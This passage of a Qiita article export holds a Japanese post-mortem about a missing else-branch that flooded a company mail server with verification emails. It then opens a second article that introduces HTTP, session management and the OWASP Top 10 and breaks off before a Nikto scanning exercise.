data-sourcepos=\"26:1-28:0\">\n<li data-sourcepos=\"26:1-26:70\">メールアドレスが <strong>個人情報として取得しづらい</strong>\n</li>\n<li data-sourcepos=\"27:1-28:0\">組織メール（特に高校など）が <strong>ほぼ運用されていない</strong>\n</li>\n</ul>\n<p data-sourcepos=\"29:1-29:51\">という現実的な問題に直面しました。</p>\n<p data-sourcepos=\"31:1-33:36\">大学生なら機構メールは使いますが、高校以下になると<br>\n「アカウントはあるけど誰も見ていない」<br>\nという状況が本当に多い。</p>\n<blockquote data-sourcepos=\"35:1-36:87\">\n<p data-sourcepos=\"35:3-36:87\">つまり<br>\n<strong>「メールアドレスを登録必須にするとサービスが使えない」</strong></p>\n</blockquote>\n<p data-sourcepos=\"38:1-40:24\">という結論になり、<br>\n<strong>「それならメールなしで登録できるようにしよう」</strong><br>\nと即決しました。</p>\n<h2 data-sourcepos=\"43:1-43:51\">\n<span id=\"実装した仕組みここまでは平和\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E8%A3%85%E3%81%97%E3%81%9F%E4%BB%95%E7%B5%84%E3%81%BF%E3%81%93%E3%81%93%E3%81%BE%E3%81%A7%E3%81%AF%E5%B9%B3%E5%92%8C\"><i class=\"fa fa-link\"></i></a>実装した仕組み（ここまでは平和）</h2>\n<p data-sourcepos=\"45:1-45:39\">実装自体はとても単純です。</p>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"47:1-51:3\"><div class=\"highlight\"><pre><code><span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">email</span><span class=\"p\">.</span><span class=\"nf\">endsWith</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">@no-address.example.com</span><span class=\"dl\">'</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n    <span class=\"nx\">mail</span><span class=\"p\">.</span><span class=\"nf\">certification</span><span class=\"p\">(</span><span class=\"kc\">true</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<p data-sourcepos=\"53:1-55:24\">このドメインを指定している場合は<br>\n<strong>「強制的にメール認証済み扱いにする」</strong><br>\nという実装です。</p>\n<p data-sourcepos=\"57:1-58:99\">ユーザー名の重複を防ぐため、<br>\n登録時には以下のようなダミーメールアドレスを自動生成していました。</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"60:1-62:3\"><div class=\"highlight\"><pre><code>g001_20250001@no-address.example.com\n</code></pre></div></div>\n<ul data-sourcepos=\"64:1-66:0\">\n<li data-sourcepos=\"64:1-64:37\">\n<code>g001_20250001</code> → ユーザー名</li>\n<li data-sourcepos=\"65:1-66:0\">\n<code>@no-address.example.com</code> → 自社ドメイン</li>\n</ul>\n<p data-sourcepos=\"67:1-68:88\">このドメインは <strong>Cloudflare Email Workers</strong> を使って、<br>\n<strong>さくらインターネットのメールサーバーに転送</strong>していました。</p>\n<h3 data-sourcepos=\"70:1-70:61\">\n<span id=\"余談さくらのメールは受信専用なら最強\" class=\"fragment\"></span><a href=\"#%E4%BD%99%E8%AB%87%E3%81%95%E3%81%8F%E3%82%89%E3%81%AE%E3%83%A1%E3%83%BC%E3%83%AB%E3%81%AF%E5%8F%97%E4%BF%A1%E5%B0%82%E7%94%A8%E3%81%AA%E3%82%89%E6%9C%80%E5%BC%B7\"><i class=\"fa fa-link\"></i></a>余談：さくらのメールは受信専用なら最強</h3>\n<p data-sourcepos=\"71:1-72:87\">メールボックスだけなら年間 <strong>2,000円ちょっと</strong> で使えるので、<br>\n「とりあえず受信用メールが欲しい」用途には本当に便利です。</p>\n<p data-sourcepos=\"74:1-74:81\">※なぜかメールが弾かれやすいので、送信には向きません。</p>\n<h2 data-sourcepos=\"76:1-76:51\">\n<span id=\"認証フローの問題点ここが伏線\" class=\"fragment\"></span><a href=\"#%E8%AA%8D%E8%A8%BC%E3%83%95%E3%83%AD%E3%83%BC%E3%81%AE%E5%95%8F%E9%A1%8C%E7%82%B9%E3%81%93%E3%81%93%E3%81%8C%E4%BC%8F%E7%B7%9A\"><i class=\"fa fa-link\"></i></a>認証フローの問題点（ここが伏線）</h2>\n<p data-sourcepos=\"78:1-78:21\">本サービスは、</p>\n<ol data-sourcepos=\"80:1-83:0\">\n<li data-sourcepos=\"80:1-80:33\">認証URLをメールで送信</li>\n<li data-sourcepos=\"81:1-81:27\">そのURLにアクセス</li>\n<li data-sourcepos=\"82:1-83:0\">パスワード等をユーザーが設定</li>\n</ol>\n<p data-sourcepos=\"84:1-84:42\">という一般的なフローでした。</p>\n<p data-sourcepos=\"86:1-86:36\">しかし今回のケースでは：</p>\n<ul data-sourcepos=\"88:1-90:0\">\n<li data-sourcepos=\"88:1-88:67\">送信先は <strong>ユーザー本人が見ないダミーメール</strong>\n</li>\n<li data-sourcepos=\"89:1-90:0\">認証URLは <strong>DBを直接見て取得する想定</strong>\n</li>\n</ul>\n<p data-sourcepos=\"91:1-92:84\">だったので、<br>\n「メールは送られなくていい」という前提になっていました。</p>\n<h2 data-sourcepos=\"94:1-94:21\">\n<span id=\"やらかし発生\" class=\"fragment\"></span><a href=\"#%E3%82%84%E3%82%89%E3%81%8B%E3%81%97%E7%99%BA%E7%94%9F\"><i class=\"fa fa-link\"></i></a>やらかし発生</h2>\n<p data-sourcepos=\"96:1-97:60\">前準備が整い、<br>\nアカウント発行処理を一括で実行しました。</p>\n<p data-sourcepos=\"99:1-99:15\">すると――</p>\n<blockquote data-sourcepos=\"101:1-102:43\">\n<p data-sourcepos=\"101:3-102:43\"><strong>さくらのメールサーバーが容量制限で死亡<br>\n社内の全メールが受信不能に</strong></p>\n</blockquote>\n<p data-sourcepos=\"104:1-104:27\">原因は単純でした。</p>\n<p data-sourcepos=\"106:1-107:64\">先ほどのコードは<br>\n<strong>「認証を強制的に true にする」処理のみ</strong>で、</p>\n<p data-sourcepos=\"109:1-109:78\">👉 <strong>「認証メールを送らない」処理を書いていなかった</strong></p>\n<p data-sourcepos=\"111:1-111:12\">つまり、</p>\n<ul data-sourcepos=\"113:1-115:0\">\n<li data-sourcepos=\"113:1-113:20\">認証済み扱い</li>\n<li data-sourcepos=\"114:1-115:0\">でも <strong>認証メールは全件送信</strong>\n</li>\n</ul>\n<p data-sourcepos=\"116:1-116:51\">という地獄の挙動になっていました。</p>\n<hr data-sourcepos=\"118:1-119:0\">\n<h3 data-sourcepos=\"120:1-120:37\">\n<span id=\"追い打ち現場猫ムーブ\" class=\"fragment\"></span><a href=\"#%E8%BF%BD%E3%81%84%E6%89%93%E3%81%A1%E7%8F%BE%E5%A0%B4%E7%8C%AB%E3%83%A0%E3%83%BC%E3%83%96\"><i class=\"fa fa-link\"></i></a>追い打ち：現場猫ムーブ</h3>\n<p data-sourcepos=\"122:1-122:39\">さらに最悪だったのがこれ。</p>\n<ul data-sourcepos=\"124:1-128:0\">\n<li data-sourcepos=\"124:1-124:52\">当該パッチは <strong>インターン生が実装</strong>\n</li>\n<li data-sourcepos=\"125:1-125:33\"><strong>コードレビューなし</strong></li>\n<li data-sourcepos=\"126:1-126:61\">「まあ大丈夫でしょ」という <strong>現場猫判断</strong>\n</li>\n<li data-sourcepos=\"127:1-128:0\">そのまま <strong>本番実行</strong>\n</li>\n</ul>\n<p data-sourcepos=\"129:1-129:51\">結果、発行されたアカウント数は……</p>\n<blockquote data-sourcepos=\"131:1-131:23\">\n<p data-sourcepos=\"131:3-131:23\"><strong>2,147,483,647 件</strong></p>\n</blockquote>\n<p data-sourcepos=\"133:1-133:112\">（※ 当時のコードが残っておらず、なぜこの数字になったのかは未だに不明です）</p>\n<p data-sourcepos=\"135:1-135:27\">メールサーバーは、</p>\n<ul data-sourcepos=\"137:1-141:0\">\n<li data-sourcepos=\"137:1-137:14\">大量送信</li>\n<li data-sourcepos=\"138:1-138:14\">大量受信</li>\n<li data-sourcepos=\"139:1-139:26\">容量上限に達する</li>\n<li data-sourcepos=\"140:1-141:0\">会社全体のメールが <strong>物理的に死亡</strong>\n</li>\n</ul>\n<p data-sourcepos=\"142:1-142:48\">という完璧なコンボを決めました。</p>\n<p data-sourcepos=\"144:1-145:92\">なお、なぜか <strong>アクセス制限やスロットリングは一切かからず</strong>、<br>\n<strong>「容量制限に当たるまで送られ続ける」</strong> という地獄仕様でした。</p>\n<h2 data-sourcepos=\"147:1-147:33\">\n<span id=\"どうすれば防げたのか\" class=\"fragment\"></span><a href=\"#%E3%81%A9%E3%81%86%E3%81%99%E3%82%8C%E3%81%B0%E9%98%B2%E3%81%92%E3%81%9F%E3%81%AE%E3%81%8B\"><i class=\"fa fa-link\"></i></a>どうすれば防げたのか</h2>\n<p data-sourcepos=\"149:1-149:45\">答えは、たったこれだけでした。</p>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"151:1-158:3\"><div class=\"highlight\"><pre><code><span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">email</span><span class=\"p\">.</span><span class=\"nf\">endsWith</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">@no-address.example.com</span><span class=\"dl\">'</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n    <span class=\"nx\">certification</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n<span class=\"k\">else</span> <span class=\"p\">{</span>\n    <span class=\"nx\">mail</span><span class=\"p\">.</span><span class=\"nf\">send</span><span class=\"p\">(</span><span class=\"nf\">certification_template</span><span class=\"p\">(</span><span class=\"nx\">code</span><span class=\"p\">));</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<p data-sourcepos=\"160:1-160:37\"><strong>たった 3 行の else 分岐。</strong></p>\n<p data-sourcepos=\"162:1-162:21\">これがあれば、</p>\n<ul data-sourcepos=\"164:1-166:0\">\n<li data-sourcepos=\"164:1-164:37\">ダミーメール → 認証のみ</li>\n<li data-sourcepos=\"165:1-166:0\">通常メール → 認証メール送信</li>\n</ul>\n<p data-sourcepos=\"167:1-167:60\">という正しい世界線に分岐できていました。</p>\n<h2 data-sourcepos=\"169:1-169:27\">\n<span id=\"結論血の教訓\" class=\"fragment\"></span><a href=\"#%E7%B5%90%E8%AB%96%E8%A1%80%E3%81%AE%E6%95%99%E8%A8%93\"><i class=\"fa fa-link\"></i></a>結論（血の教訓）</h2>\n<p data-sourcepos=\"171:1-171:51\">今回の事故から得た教訓はこれです。</p>\n<ul data-sourcepos=\"173:1-176:0\">\n<li data-sourcepos=\"173:1-173:80\">仕様が変わる時は「既存フロー前提」で雑に継ぎ足さない</li>\n<li data-sourcepos=\"174:1-174:91\">想定外の入力（今回で言うダミーメール）には <strong>必ず分岐を書く</strong>\n</li>\n<li data-sourcepos=\"175:1-176:0\"><strong>どんなに急いでいてもコードレビューは省略しない</strong></li>\n</ul>\n<p data-sourcepos=\"177:1-177:24\">そして何より――</p>\n<blockquote data-sourcepos=\"179:1-179:60\">\n<p data-sourcepos=\"179:3-179:60\"><strong>「送信系の処理は最悪“爆撃”になる」</strong></p>\n</blockquote>\n<p data-sourcepos=\"181:1-181:54\">ということを、身をもって学びました。</p>\n<h2 data-sourcepos=\"183:1-183:15\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h2>\n<p data-sourcepos=\"185:1-186:72\">なお、この事故は夜中に実行して、夜中に解消できたので開発陣営以外は知る由もありませんでした。<br>\nよって、誰にも怒られることなく闇に葬られました。</p>\n<p data-sourcepos=\"188:1-189:108\">Advent Calendar らしく、<br>\nどこかの誰かが <strong>同じ地雷を踏まないこと</strong> を願って、供養として公開します。</p>\n",
      "body": "# コードミスで自社メールサーバーを受信不能にした話\n\n*― たった4行を書かなかったせいで会社のメールが全滅した ―*\n\nこの記事は\n**[本番環境などでやらかしちゃった人 Advent Calendar 2025](https://qiita.com/advent-calendar/2025/yarakashi)**\nの **9日目** の記事です。\n\n今回は、\n**「4行の if 文を入れ忘れた結果、自社で契約しているメールサーバーを物理的に爆撃した話」**\nを供養します。\n\n## きっかけ\n\n**「メールアドレスなしでもアカウント登録できるようにしたい」**\n\nもともと本サービスでは、初回登録時に以下の情報が必須でした。\n\n* メールアドレス\n* ユーザー名\n* 名前\n* 初回ログインパスワード（6桁）\n\nしかし、公的機関向けに提供する都合上、\n\n* メールアドレスが **個人情報として取得しづらい**\n* 組織メール（特に高校など）が **ほぼ運用されていない**\n\nという現実的な問題に直面しました。\n\n大学生なら機構メールは使いますが、高校以下になると\n「アカウントはあるけど誰も見ていない」\nという状況が本当に多い。\n\n> つまり\n> **「メールアドレスを登録必須にするとサービスが使えない」**\n\nという結論になり、\n**「それならメールなしで登録できるようにしよう」**\nと即決しました。\n\n\n## 実装した仕組み（ここまでは平和）\n\n実装自体はとても単純です。\n\n```ts\nif (email.endsWith('@no-address.example.com')) {\n    mail.certification(true);\n}\n```\n\nこのドメインを指定している場合は\n**「強制的にメール認証済み扱いにする」**\nという実装です。\n\nユーザー名の重複を防ぐため、\n登録時には以下のようなダミーメールアドレスを自動生成していました。\n\n```\ng001_20250001@no-address.example.com\n```\n\n* `g001_20250001` → ユーザー名\n* `@no-address.example.com` → 自社ドメイン\n\nこのドメインは **Cloudflare Email Workers** を使って、\n**さくらインターネットのメールサーバーに転送**していました。\n\n### 余談：さくらのメールは受信専用なら最強\nメールボックスだけなら年間 **2,000円ちょっと** で使えるので、\n「とりあえず受信用メールが欲しい」用途には本当に便利です。\n\n※なぜかメールが弾かれやすいので、送信には向きません。\n\n## 認証フローの問題点（ここが伏線）\n\n本サービスは、\n\n1. 認証URLをメールで送信\n2. そのURLにアクセス\n3. パスワード等をユーザーが設定\n\nという一般的なフローでした。\n\nしかし今回のケースでは：\n\n* 送信先は **ユーザー本人が見ないダミーメール**\n* 認証URLは **DBを直接見て取得する想定**\n\nだったので、\n「メールは送られなくていい」という前提になっていました。\n\n## やらかし発生\n\n前準備が整い、\nアカウント発行処理を一括で実行しました。\n\nすると――\n\n> **さくらのメールサーバーが容量制限で死亡\n> 社内の全メールが受信不能に**\n\n原因は単純でした。\n\n先ほどのコードは\n**「認証を強制的に true にする」処理のみ**で、\n\n👉 **「認証メールを送らない」処理を書いていなかった**\n\nつまり、\n\n* 認証済み扱い\n* でも **認証メールは全件送信**\n\nという地獄の挙動になっていました。\n\n---\n\n### 追い打ち：現場猫ムーブ\n\nさらに最悪だったのがこれ。\n\n* 当該パッチは **インターン生が実装**\n* **コードレビューなし**\n* 「まあ大丈夫でしょ」という **現場猫判断**\n* そのまま **本番実行**\n\n結果、発行されたアカウント数は……\n\n> **2,147,483,647 件**\n\n（※ 当時のコードが残っておらず、なぜこの数字になったのかは未だに不明です）\n\nメールサーバーは、\n\n* 大量送信\n* 大量受信\n* 容量上限に達する\n* 会社全体のメールが **物理的に死亡**\n\nという完璧なコンボを決めました。\n\nなお、なぜか **アクセス制限やスロットリングは一切かからず**、\n**「容量制限に当たるまで送られ続ける」** という地獄仕様でした。\n\n## どうすれば防げたのか\n\n答えは、たったこれだけでした。\n\n```ts\nif (email.endsWith('@no-address.example.com')) {\n    certification = true;\n}\nelse {\n    mail.send(certification_template(code));\n}\n```\n\n**たった 3 行の else 分岐。**\n\nこれがあれば、\n\n* ダミーメール → 認証のみ\n* 通常メール → 認証メール送信\n\nという正しい世界線に分岐できていました。\n\n## 結論（血の教訓）\n\n今回の事故から得た教訓はこれです。\n\n* 仕様が変わる時は「既存フロー前提」で雑に継ぎ足さない\n* 想定外の入力（今回で言うダミーメール）には **必ず分岐を書く**\n* **どんなに急いでいてもコードレビューは省略しない**\n\nそして何より――\n\n> **「送信系の処理は最悪“爆撃”になる」**\n\nということを、身をもって学びました。\n\n## おわりに\n\nなお、この事故は夜中に実行して、夜中に解消できたので開発陣営以外は知る由もありませんでした。\nよって、誰にも怒られることなく闇に葬られました。\n\nAdvent Calendar らしく、\nどこかの誰かが **同じ地雷を踏まないこと** を願って、供養として公開します。\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-09T14:33:03+09:00",
      "group": null,
      "id": "f70bdbb84c9d50959888",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "さくらのレンタルサーバ",
          "versions": []
        },
        {
          "name": "AdventCalendar2025",
          "versions": []
        }
      ],
      "title": "コードミスで自社メールサーバーを受信不能にした話",
      "updated_at": "2025-12-09T14:33:03+09:00",
      "url": "https://qiita.com/tampopo256/items/f70bdbb84c9d50959888",
      "user": {
        "description": "",
        "facebook_id": "",
        "followees_count": 1,
        "followers_count": 4,
        "github_login_name": "tampopo256",
        "id": "tampopo256",
        "items_count": 36,
        "linkedin_id": "",
        "location": "岐阜県",
        "name": "",
        "organization": "花園大学",
        "permanent_id": 3901203,
        "profile_image_url": "https://avatars.githubusercontent.com/u/67646094?v=4",
        "team_only": false,
        "twitter_screen_name": "kurosangurasu",
        "website_url": ""
      },
      "page_views_count": null,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "trending_by_likes"
    },
    {
      "rendered_body": "<hr data-sourcepos=\"1:1-2:0\">\n<h1 data-sourcepos=\"3:1-3:8\">\n<span id=\"導入\" class=\"fragment\"></span><a href=\"#%E5%B0%8E%E5%85%A5\"><i class=\"fa fa-link\"></i></a>導入</h1>\n<p data-sourcepos=\"5:1-5:120\">本記事は以下の続編として、Webアプリケーションにおける脆弱性評価と演習を扱います。</p>\n<p data-sourcepos=\"7:1-7:51\"><iframe id=\"qiita-embed-content__698cf5ca76ebd1fe724518954e4d5451\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__698cf5ca76ebd1fe724518954e4d5451\" data-content=\"https%3A%2F%2Fqiita.com%2Fdabide%2Fitems%2Fbbb85cddc574e0517723\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<hr data-sourcepos=\"9:1-11:0\">\n<h2 data-sourcepos=\"12:1-12:36\">\n<span id=\"この記事で得られること\" class=\"fragment\"></span><a href=\"#%E3%81%93%E3%81%AE%E8%A8%98%E4%BA%8B%E3%81%A7%E5%BE%97%E3%82%89%E3%82%8C%E3%82%8B%E3%81%93%E3%81%A8\"><i class=\"fa fa-link\"></i></a>この記事で得られること</h2>\n<ul data-sourcepos=\"14:1-18:0\">\n<li data-sourcepos=\"14:1-14:45\">HTTP/HTTPSの基本構造と通信の流れ</li>\n<li data-sourcepos=\"15:1-15:56\">Webアプリケーションの脆弱性とOWASP Top 10</li>\n<li data-sourcepos=\"16:1-16:71\">ハンズオンに基づく脆弱性スキャンおよび検証方法</li>\n<li data-sourcepos=\"17:1-18:0\">独自 Web アプリラボの構築と典型的な設計ミスの理解</li>\n</ul>\n<hr data-sourcepos=\"19:1-20:0\">\n<h1 data-sourcepos=\"21:1-21:27\">\n<span id=\"️-注意必読\" class=\"fragment\"></span><a href=\"#%EF%B8%8F-%E6%B3%A8%E6%84%8F%E5%BF%85%E8%AA%AD\"><i class=\"fa fa-link\"></i></a>⚠️ 注意（必読）</h1>\n<blockquote data-sourcepos=\"23:1-25:65\">\n<p data-sourcepos=\"23:3-25:65\">本記事で扱う内容は、悪用した場合、重大な法的リスクを伴います。<br>\n許可された演習環境・検証環境でのみ実施してください。<br>\n実在組織・個人への攻撃は禁止されています。</p>\n</blockquote>\n<hr data-sourcepos=\"27:1-28:0\">\n<h2 data-sourcepos=\"29:1-29:21\">\n<span id=\"本章について\" class=\"fragment\"></span><a href=\"#%E6%9C%AC%E7%AB%A0%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6\"><i class=\"fa fa-link\"></i></a>本章について</h2>\n<p data-sourcepos=\"30:1-31:66\">6章ではアプリケーションベースの脆弱性の悪用を解説しますが、<br>\n内容が広範なため複数の記事に分割いたします。</p>\n<p data-sourcepos=\"33:1-33:37\">以下が6章全体の構成です。</p>\n<ul data-sourcepos=\"35:1-46:0\">\n<li data-sourcepos=\"35:1-35:93\">6.1. Webアプリケーションベースの攻撃の概要とOWASPトップ10👈本記事</li>\n<li data-sourcepos=\"36:1-36:62\">6.2. 独自のWebアプリラボの構築方法👈本記事</li>\n<li data-sourcepos=\"37:1-37:62\">6.3. ビジネスロジックの欠陥の理解👈本記事</li>\n<li data-sourcepos=\"38:1-38:58\">6.4. インジェクションベースの脆弱性理解</li>\n<li data-sourcepos=\"39:1-39:40\">6.5. 認証ベースの脆弱性悪用</li>\n<li data-sourcepos=\"40:1-40:76\">6.6. クロスサイトスクリプティング（XSS）の脆弱性理解</li>\n<li data-sourcepos=\"41:1-41:145\">6.7. クロスサイトリクエストフォージェリ（CSRF/XSRF）とサーバーサイトリクエストフォージェリ攻撃の概要</li>\n<li data-sourcepos=\"42:1-42:46\">6.8. クリックジャッキングの概要</li>\n<li data-sourcepos=\"43:1-43:55\">6.9. ファイルインクルード脆弱性の悪用</li>\n<li data-sourcepos=\"44:1-46:0\">6.10. 安全でないコードの悪用</li>\n</ul>\n<hr data-sourcepos=\"47:1-47:3\">\n<h2 data-sourcepos=\"48:1-48:64\">\n<span id=\"61-webアプリケーション攻撃の概要とowasp-top-10\" class=\"fragment\"></span><a href=\"#61-web%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E6%94%BB%E6%92%83%E3%81%AE%E6%A6%82%E8%A6%81%E3%81%A8owasp-top-10\"><i class=\"fa fa-link\"></i></a>6.1 Webアプリケーション攻撃の概要とOWASP Top 10</h2>\n<h3 data-sourcepos=\"50:1-50:42\">\n<span id=\"-httphttpsプロトコルの基礎\" class=\"fragment\"></span><a href=\"#-httphttps%E3%83%97%E3%83%AD%E3%83%88%E3%82%B3%E3%83%AB%E3%81%AE%E5%9F%BA%E7%A4%8E\"><i class=\"fa fa-link\"></i></a>● HTTP/HTTPSプロトコルの基礎</h3>\n<p data-sourcepos=\"52:1-52:153\">HTTPは<strong>ステートレスなアプリケーションレベルプロトコル</strong>で、リクエスト/レスポンスモデルを採用しています。</p>\n<ul data-sourcepos=\"54:1-57:0\">\n<li data-sourcepos=\"54:1-54:96\">\n<strong>クライアント</strong>: ブラウザ、APIクライアント、カスタムHTTPプログラム</li>\n<li data-sourcepos=\"55:1-55:59\">\n<strong>サーバー</strong>: Webサーバー（例: Apache, Nginx）</li>\n<li data-sourcepos=\"56:1-57:0\">\n<strong>特徴</strong>: 単純で理解しやすいが、ステートレスであるためセッション管理をアプリケーション側で行う必要がある</li>\n</ul>\n<p data-sourcepos=\"58:1-58:38\">HTTPトランザクションの流れ:</p>\n<p data-sourcepos=\"60:1-62:65\">1.TCP 3-way ハンドシェイク<br>\n2.HTTP GET / POST リクエスト送信<br>\n3.サーバーが HTTP レスポンス（例：200 OK）を返却</p>\n<p data-sourcepos=\"64:1-64:29\">代表的なHTTPメソッド:</p>\n<table data-sourcepos=\"66:1-73:84\">\n<thead>\n<tr data-sourcepos=\"66:1-66:45\">\n<th data-sourcepos=\"66:2-66:18\">メソッド</th>\n<th data-sourcepos=\"66:20-66:44\">説明</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"68:1-68:45\">\n<td data-sourcepos=\"68:2-68:10\">GET</td>\n<td data-sourcepos=\"68:12-68:44\">リソース取得</td>\n</tr>\n<tr data-sourcepos=\"69:1-69:43\">\n<td data-sourcepos=\"69:2-69:10\">POST</td>\n<td data-sourcepos=\"69:12-69:42\">データ送信</td>\n</tr>\n<tr data-sourcepos=\"70:1-70:45\">\n<td data-sourcepos=\"70:2-70:10\">PUT</td>\n<td data-sourcepos=\"70:12-70:44\">リソース更新</td>\n</tr>\n<tr data-sourcepos=\"71:1-71:45\">\n<td data-sourcepos=\"71:2-71:10\">DELETE</td>\n<td data-sourcepos=\"71:12-71:44\">リソース削除</td>\n</tr>\n<tr data-sourcepos=\"72:1-72:71\">\n<td data-sourcepos=\"72:2-72:10\">OPTIONS</td>\n<td data-sourcepos=\"72:12-72:70\">サーバーがサポートするメソッド一覧取得</td>\n</tr>\n<tr data-sourcepos=\"73:1-73:84\">\n<td data-sourcepos=\"73:2-73:10\">CONNECT</td>\n<td data-sourcepos=\"73:12-73:83\">HTTPプロキシに対し任意ホストへのTCPトンネルを要求</td>\n</tr>\n</tbody>\n</table>\n<p data-sourcepos=\"75:1-75:49\">HTTPリクエスト構造に含まれる要素：</p>\n<ul data-sourcepos=\"76:1-81:0\">\n<li data-sourcepos=\"76:1-76:18\">HTTPメソッド</li>\n<li data-sourcepos=\"77:1-77:70\">URIとリソースへのパス － 要求されたURLのパス部分</li>\n<li data-sourcepos=\"78:1-78:98\">リクエストバージョン番号 － クライアントが使用するHTTPのバージョン</li>\n<li data-sourcepos=\"79:1-81:0\">ユーザーエージェント － ユーザーが使用するブラウザなどのエージェント情報<br>\nなど</li>\n</ul>\n<p data-sourcepos=\"82:1-82:16\">URL構造の例:</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"84:1-86:3\"><div class=\"highlight\"><pre><code>https://theartofhacking.org:8123/dir/test;id=89?name=omar&amp;x=true\n</code></pre></div></div>\n<ul data-sourcepos=\"88:1-94:0\">\n<li data-sourcepos=\"88:1-88:21\">スキーム: https</li>\n<li data-sourcepos=\"89:1-89:32\">ホスト: theartofhacking.org</li>\n<li data-sourcepos=\"90:1-90:17\">ポート: 8123</li>\n<li data-sourcepos=\"91:1-91:19\">パス: /dir/test</li>\n<li data-sourcepos=\"92:1-92:30\">パスパラメータ: id=89</li>\n<li data-sourcepos=\"93:1-94:0\">クエリ文字列: name=omar&amp;x=true</li>\n</ul>\n<hr data-sourcepos=\"95:1-96:0\">\n<h3 data-sourcepos=\"97:1-97:50\">\n<span id=\"-webセッションとセッション管理\" class=\"fragment\"></span><a href=\"#-web%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%A8%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E7%AE%A1%E7%90%86\"><i class=\"fa fa-link\"></i></a>● Webセッションとセッション管理</h3>\n<p data-sourcepos=\"99:1-99:140\">Webセッションは、<strong>HTTPリクエストとレスポンスの一連のやり取り</strong>を通じてユーザー状態を管理します。</p>\n<ul data-sourcepos=\"101:1-108:65\">\n<li data-sourcepos=\"101:1-104:136\">\n<strong>セッションIDの役割</strong>: 認証後、パスワード並みに機密性を持つ識別子\n<ul data-sourcepos=\"102:5-104:136\">\n<li data-sourcepos=\"102:5-102:110\">\n<strong>推奨</strong>: 128ビット以上、できれば256ビットのエントロピーを持つセッションID</li>\n<li data-sourcepos=\"103:5-104:136\">\n<strong>セッション管理手段</strong>: Cookie（推奨）※、URLパラメータ（非推奨）、隠しフォームフィールド<br>\n※Cookieにも永続（Persient Cookie）と非永続（Session Cookie）の２種類存在し、Session Cookieによる管理を推奨</li>\n</ul>\n</li>\n<li data-sourcepos=\"105:1-108:65\">\n<strong>セッション管理におけるその他の推奨事項</strong>:\n<ul data-sourcepos=\"106:5-108:65\">\n<li data-sourcepos=\"106:5-106:27\">TLSによる暗号化</li>\n<li data-sourcepos=\"107:5-107:42\">既存フレームワークの利用</li>\n<li data-sourcepos=\"108:5-108:65\">セッションIDの検証・バリデーションの徹底</li>\n</ul>\n</li>\n</ul>\n<hr data-sourcepos=\"109:1-110:0\">\n<h3 data-sourcepos=\"111:1-111:20\">\n<span id=\"-owasp-top-10\" class=\"fragment\"></span><a href=\"#-owasp-top-10\"><i class=\"fa fa-link\"></i></a>● OWASP Top 10</h3>\n<p data-sourcepos=\"113:1-114:59\">OWASP（Open Web Application Security Project）が公開する<strong>Webアプリケーションの重大な脆弱性トップ10</strong>。<br>\n最新情報: <a href=\"https://owasp.org/Top10/2025/\" rel=\"nofollow noopener\" target=\"_blank\">OWASP Top 10</a></p>\n<p data-sourcepos=\"116:1-116:15\">2025年のTOP10</p>\n<ol data-sourcepos=\"118:1-128:0\">\n<li data-sourcepos=\"118:1-118:24\">Broken Access Control</li>\n<li data-sourcepos=\"119:1-119:28\">Security Misconfiguration</li>\n<li data-sourcepos=\"120:1-120:33\">Software Supply Chain Failures</li>\n<li data-sourcepos=\"121:1-121:25\">Cryptographic Failures</li>\n<li data-sourcepos=\"122:1-122:12\">Injection</li>\n<li data-sourcepos=\"123:1-123:18\">Insecure Design</li>\n<li data-sourcepos=\"124:1-124:26\">Authentication Failures</li>\n<li data-sourcepos=\"125:1-125:38\">Software or Data Integrity Failures</li>\n<li data-sourcepos=\"126:1-126:32\">Logging and Alerting Failures</li>\n<li data-sourcepos=\"127:1-128:0\">Mishandling of Exceptional Conditions</li>\n</ol>\n<h2 data-sourcepos=\"129:1-129:60\">\n<span id=\"実践演習ウェブサイトの脆弱性スキャン\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E8%B7%B5%E6%BC%94%E7%BF%92%E3%82%A6%E3%82%A7%E3%83%96%E3%82%B5%E3%82%A4%E3%83%88%E3%81%AE%E8%84%86%E5%BC%B1%E6%80%A7%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\"><i class=\"fa fa-link\"></i></a>実践演習：ウェブサイトの脆弱性スキャン</h2>\n<p data-sourcepos=\"130:1-131:57\">NiktoというXSSなどの脆弱性を検知できるウェブスキャナーを利用して<br>\nスキャン方法と読み解き方を学習します。</p>\n<h3 data-sourcepos=\"133:1-133:60\">\n<span id=\"one-niktoの起動とテストサイトのスキャン\" class=\"fragment\"></span><a 